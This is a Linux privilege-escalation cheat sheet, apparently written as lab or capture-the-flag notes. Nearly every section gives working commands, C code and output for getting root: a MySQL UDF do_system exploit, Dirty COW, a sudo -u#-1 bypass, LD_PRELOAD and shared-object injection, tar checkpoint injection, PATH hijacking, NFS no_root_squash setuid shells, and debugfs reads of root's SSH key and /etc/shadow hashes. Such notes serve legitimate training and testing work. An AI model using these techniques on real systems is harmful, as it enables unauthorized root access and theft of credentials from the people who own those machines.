# Linux Privilege Escalation

Tags :

## Contents
[Mysql Service as root](#MySQL-Service-as-root)

[Hash Cracking](#Hash-Cracking)

[Tmux Socket Sessions](#Tmux-Socket-Sessions)

[PATH Variable Manipulation](#PATH-Variable-Manipulation)

[Kernel Exploits](#Kernel-Exploits)

[Juicy Files and Directories](#Juicy-Files-and-Directories)

[Writable passwd or shadow](#Writable-passwd-or-shadow)

[Users permissions](#Users-permissions)

[Sudo Vulnerability](#Sudo-Vulnerability)

[LD_PRELOAD env variable](#LD-PRELOAD-env-variable)

[LD_LIBRARY_PATH](#LD_LIBRARY_PATH-env-variable)

[Cap setuid capability](#Cap-setuid-capability)

[Cron Jobs](#Cron-Jobs)

[Tar wildcard injection](#Tar-wildcard-injection)

[Python Module Injection](#Python-Module-Injection)

[Shared Object Injection](#Shared-Object-Injection)

[Nginx Logrotate CVE](#Nginx-Logrotate-CVE)

[Chkrootkit 0.49 CVE](#Chkrootkit-0.49-CVE)

[NFS Root Squashing](#NFS-Root-Squashing)

[Disk Group](#Disk-Group)

[LXD Group](#Disk-Group)

[Docket Group](#Docker-Group)

[Initctl Jobs](#Initctl-Jobs)

## MySQL Service as root

if mysql service is running as root and we have root credentials then we can execute commands via **User-DefinedFunctions**

this exploit works for mysql 4.x/5.0
Download [here](https://www.exploit-db.com/download/1518)
save it as raptor_udf2.c 

Now Compile into object and sharedobjects
```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

then connect to mysql 
in that we create a new table and load this sharedobject into that table
we then copy contents into original raptor_udf2.so file

```bash
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

then we can execute commands as arguments to our function
```bash
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

now we have copied bash into tmp and added s bit on
so we can run that as root by default
```
/tmp/rootbash -p
```


## Hash Cracking

when user set weak password , it can be cracked with johntheripper
password hashes are found in **/etc/shadow** file 
this file contents are generally cannot be readable by any user
if incase normal user can read this file then we can try to bruteforce hashes
copy hash into a file
```
./john --format=sha512crypt -w=rockyou.txt hashfile
```
if the password is in rockyou.txt you will get password


## Tmux Socket Sessions

tmux can be left open by root user or any other user
using ps command we can verify on which socket tmux is running

```
ps -aux | grep tmux
tmux -S /tmp/socket
```
you will get a tmux session


## VNC Sessions

## PATH Variable Manipulation

we have binary and it executes another binary but it doesnot uses absolutepath it only uses relative path
in that case we can write fake binary in that directory
if the directory is not writable we can create fake binary in /tmp and can change PATH variable

here we have binary and its source code
if we dont have source code , we can apply strings on that binary
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
int main() {

    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");
    char user[80];
    fgets(user, 80, f);
    printf("you are: %s\n", user);
    //printf("your euid is: %i\n", geteuid());
    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
	setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}

```

we can see popen function and whoami binary is not full path 
popen function executes the binary specified and takes that binary's output into filestream
and script checks if we are tom user then it drops root shell
let's create a binary in /tmp named whoami

```bash
touch /tmp/whoami
echo "echo tom" > /tmp/whoami
chmod +x /tmp/whoami
```

now we need to change PATH variable because by default rootshell binary takes from /bin

```bash
export PATH=/tmp:$PATH
```

now run the rootshell binary and we get root shell

## Kernel Exploits

type uname -a command to retrieve linux kernel version
you can google this kernel number to find any kernel exploits

we can use tools which will retrieve kernel number and find kernel exploits that might work 
those are 

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh)

[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl)

second script requires perl to be installed on linux , as most of distros comes perl by default we can use this perl script
this perl script is lot more cleaner than first one 


```bash
TCM@debian:~/tools/linux-exploit-suggester$ perl linux-exploit-suggester-2.pl

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 2.6.32
  Searching 72 exploits...

  Possible Exploits
  [1] american-sign-language
      CVE-2010-4347
      Source: http://www.securityfocus.com/bid/45408
  [2] can_bcm
      CVE-2010-2959
      Source: http://www.exploit-db.com/exploits/14814
  [3] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
	  --snip--
```

dirty cow is famous linux kernel exploit 
we can use that
grab from [here](https://www.exploit-db.com/exploits/40839)

```bash
TCM@debian:~/tools/dirtycow$ gcc -pthread c0w.c -o cow  -lcrypt
TCM@debian:~/tools/dirtycow$ ls
c0w.c  cow
TCM@debian:~/tools/dirtycow$ ./cow
```

then type passwd
```bash
TCM@debian:~/tools/dirtycow$ passwd
root@debian:/home/user/tools/dirtycow# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:/home/user/tools/dirtycow# whoami
root
```

## Juicy Files and Directories

there are some directories you need to look for any juicy information
```
/opt/
/backup
/var/backup
readable .bash_history
/mnt/
other user's ssh keys
/user/.ssh/id_rsa
webserver's configuration files
/config.php 
```

## Writable passwd or shadow

if passwd is writable we can add new user
```bash
arrow@ideapad:~/tools/privesc$ mkpasswd -m sha512crypt arrow
$6$GQaxR2lccvxiN$MJBxFbqAeuONoioX1sF2SwjmM9Ntf0fa4LkSl86YeVqHRz2QMid.d18e.mzr/ODprEXGrNHE16OSKyE/Yr5UG1
```

copy that hash and paste at end of passwd like this
```
arrow:$6$GQaxR2lccvxiN$MJBxFbqAeuONoioX1sF2SwjmM9Ntf0fa4LkSl86YeVqHRz2QMid.d18e.mzr/ODprEXGrNHE16OSKyE/Yr5UG1:0:0:/root:/bin/bash
```


## Users permissions

type `sudo -l` to list user's permissions
if any binary we can run with NOPASSWD or as root with our password we can take advantage of that binary to get root shell

```bash
sudo -l
    (root) NOPASSWD: /usr/bin/find
sudo /usr/bin/find ./ -name myvpn.ovpn -exec /bin/bash -p \;
we get root shell
```

for info on more binaries you can refer website called
[GTFOBins](https://gtfobins.github.io/)

## Sudo Vulnerability

after typing sudo -l if you get like !root then you can take advantage of this

`(ALL, !root) /bin/bash`

```bash
sudo -u#-1 /bin/bash
will give u root shell
```

even in place of binbash if you have other binary you can do the same

## LD_PRELOAD env variable

run sudo -l 
`env_reset, env_keep+=LD_PRELOAD`
then if u see preserving the LD_PRELOAD variable then you can specify own .so file when running binary
ld_preload variable holds .so files that are being loaded into memory and run before actual program runs

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
in the above code we are unsetting any values for LD_PRELOAD and then setting our user and group id as 0 (root's) and then executing bash

compile this using gcc
`gcc -fPIC -shared -nostartfiles x.c -o x.so`

now put LD_PRELOAD env variable point to our shared object file and then run binary
that shared object will load and run before executing our actual program
```bash
TCM@debian:~$ sudo LD_PRELOAD=/home/user/x.so /usr/sbin/apache2
root@debian:/home/user# 
```

## LD_LIBRARY_PATH env variable

shared objects used by binary are fetched first from LD_LIBRARY_PATH if it was set any directory value
so we can put our fake shared object file in /tmp and point LD_LIBRARY_PATH to /tmp and our sharedobject gets loaded and run 


## Cap setuid capability

running linpeas will reveal binaries with this capability 
but this command also can reveal
```
getcap -r / 2>/dev/null
```

if its python or perl go to gtfo bins and execute to pwn root shell

## Cron Jobs

`cat /etc/crontab` contains cron jobs 
ls /etc/cron* also can contain cron jobs
if you didnot see any , run linpeas it may find 

```bash
TCM@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

we have overwrite.sh script which is run by root user every minute 
and see PATH variable and starting path is /home/user
so we can create a fake overwrite.sh 

```bash
echo "id > /tmp/test" > overwrite.sh
chmod +x overwrite.sh
```

after one minute you should see a file test in /tmp with root user info
then put reverse shell in that overwrite.sh and get root shell


## Tar wildcard injection

tar binary have a option to backup all files in directory using asterisk *
```
cd /home/user
tar czf /tmp/backup.tar.gz *
```

its backing up all files in /home/user to /tmp
we can create two files with the names
--checkpoint=1 and --checkpoint-action=exec=sh shell.sh
in the /home/user
when tar is being executed it takes all the file names including our checkpoints
when it hit a checkpoint 1 it executes an action which is shell.sh
put a reverse shell in shell.sh
```bash
cd /home/user
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "reverse shell" > shell.sh
```


## Python Module Injection

when there is python script run by cron job as root
see what modules it imports 
say it imports os module 
and the python script is in say /home/arrow 
if you can write to that directory then create a os.py file in the same folder as of that cronjob script
then put a python reverse shell in it 
whenever cron job executes it script imports this os.py file and executes it
if that directory is not writable then check permissions in
```
/usr/lib/python3/os.py
or
/usr/lib/python2/os.py
```

if thats writable then add reverse shell to that file
```
cd /home/arrow
echo "reverse shell " > os.py
```


## Shared Object Injection

we can find binaries using find command
```
find / -type f -perm -04000 -ls 2>/dev/null
```

in our case its /usr/local/bin/suid-so
to run functions in .so file this binary should open it or access it 
we can use strace to see what systemcalls its using
```bash
TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```
its using a .so file from /home/user/.config directory and its name is libcalc.so 
create a file in that directory with that name
put this c code into that libcacl.c
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

now compile with gcc
`gcc libcalc.c -shared -fPIC -o libcalc.so`

now run that binary
```bash
TCM@debian:~/.config$ gcc libcalc.c -shared -fPIC -o libcalc.so
TCM@debian:~/.config$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# whoami
root
```


## Nginx Logrotate CVE

this works only when we are www-data and <=1.6.2
```bash
www-data@debian:/home/user/tools/nginx$ dpkg -l | grep nginx
ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files
ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)
```

download this shellscript and execute it with /var/log/nginx/error.log as argument
now we need to wait until logrotate occurs
we can manually trigger this with root user
or if there is any cronjob triggering this

```bash
./nginxed-root.sh /var/log/nginx/error.log
and in other root shell 
invoke-rc.d nginx rotate >/dev/null 2>&1
```
and we get the rootshell


## Chkrootkit 0.49 CVE

chkrootkit has local privesc cve
put binary named 'update' in /tmp 
put reverse shell in update and chmod +x it 

whenever cron job executes chkrootkit it executes /tmp/update 

## NFS Root Squashing

when a nfs share has no_root_squash this means that root user on client can access that share with root privileges
type cat /etc/exports on victim box and u can see /tmp with no_root_squash 
```
showmount -e 10.10.121.162
Export list for 10.10.121.162:
/tmp *
```

switch to root user on kali and
lets mount in /tmp/share1
```bash
mount -o rw,vers=2 10.10.121.162:/tmp /tmp/share1
```

now create a  binary and put a reverse shell in it
```bash
touch /tmp/share1/shell
echo "reverse shell" > /tmp/share1/shell
chmod +s /tmp/share1/shell
```

now from victim box with low privileged user
execute /tmp/shell
we get root shell


## Disk Group

use id command to see what groups we are in
if we are member of disk group we can try to read contents as root user 
we can use debugfs on the corresponding /dev/sda
in my case its /dev/sda6
generally its /dev/sda1
```
└─$ debugfs /dev/sda6
debugfs 1.45.5 (07-Jan-2020)
debugfs:  cat /home/arrow/flag.txt
u got it
debugfs:  cat /root/.ssh/id_rsa
u get the private key
```

## LXD Group


